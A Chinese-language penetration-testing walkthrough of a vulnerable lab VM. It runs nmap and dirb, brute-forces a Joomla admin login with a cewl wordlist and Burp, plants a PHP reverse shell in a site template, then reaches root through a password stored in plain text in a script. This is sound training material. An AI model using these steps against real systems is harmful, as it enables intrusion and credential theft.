VMware双击打开，默认nat模式即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.228)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.228 -p- -A
PORT   STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Welcome to my website
111/tcp   open  rpcbind 2-4 (RPC #100000)
52121/tcp open  status  1 (RPC #100024)


--------------------------------------------
--------------------------------------------
3、web信息收集-目录爆破
dirb http://192.168.253.228/
http://192.168.253.228/joomla/

已经找到了joomla目录，将在浏览器上浏览joomla目录：
http://192.168.253.228/joomla/

--------------------------------------------
--------------------------------------------
4、Joomla

访问发现这是Joomla站！https://baike.baidu.com/item/joomla/3104596

Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，最新版本是3.9.27。可以在Linux、 Windows、MacOSX等各种不同的平台上执行。是由Open Source Matters（见扩展阅读）这个开放源码组织进行开发与支持，这个组织的成员来自全世界各地，小组成员约有150人，包含了开发者、设计者、系统管理者、文件撰写者，以及超过2万名的参与会员。
自2012年颁奖典礼开始以来，Joomla连续多年成为CMS评奖的冠军。继2015、2016、2017、2018年在全球CMS评测中，它再次获得“最佳开源CMS”奖!

--------------------------------------------
--------------------------------------------
5、JoomScan漏扫

漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。 该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。

joomscan -u http://192.168.253.228/

[++] Joomla 3.6.0
[++] Admin page : http://192.168.253.228/joomla/administrator/
发现后台登录页面！

--------------------------------------------
--------------------------------------------
6、暴力破解管理后台

joomla default credentials   ---谷歌搜索
If this is your first time logging in as the root administrator, the default username is admin. Enter the password you created during installation. Click Login. You are now logged in to Joomla as admin, on the admin panel.
查看到默认用户名为：admin

joomla使用手册：
https://support.websoft9.com/docs/joomla/zh/stack-accounts.html#joomla


尝试默认账号密码登录：
admin  admin

提示：
Warning
Username and password do not match or you do not have an account yet.

警告：
用户名和密码不匹配，或者您还没有帐户。

页面爬密码文本：
cewl http://192.168.253.228/joomla/ > pass.txt
wc -l pass.txt     
126 pass.txt

burpsuite爆破：
发现仅有travel length显示：301   
对应了网页的聊天：So my passions are travel , football , music .

wfuzz 用这个方法也可以！hydra


admin
travel


--------------------------------------------
--------------------------------------------
7、getshell-Joomla

菜单栏上的：Extensions -> Templates -> Templates
进入后选择第一个模快：Beez3 Details and Files

index.php写入：php-reverse-shell.php
cp /usr/share/webshells/php/php-reverse-shell.php .

save后点击Template Preview成功获得反弹shell！

--------------------------------------------
--------------------------------------------
8、内部信息收集：

Linux version 3.16.0-6-586

127.0.0.1:3306


You can write SUID file: /usr/bin/sudo

You can write script: /usr/bin/gettext.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /lib/systemd/systemd-udevd
/lib/systemd/systemd-bus-proxyd
/lib/systemd/systemd



find / -user tim 2>&1 | grep -v "Permission denied\|proc"
/opt/scripts/fileshare.py
/var/mail/ted


--------------------------------------------
--------------------------------------------
9、提权

cat /opt/scripts/fileshare.py
hostname = "localhost"
password = "lulzlol

su tim
lulzlol


sudo -l
User tim may run the following commands on born2root:
    (ALL : ALL) ALL


sudo su   ---成功拿到root权限！































































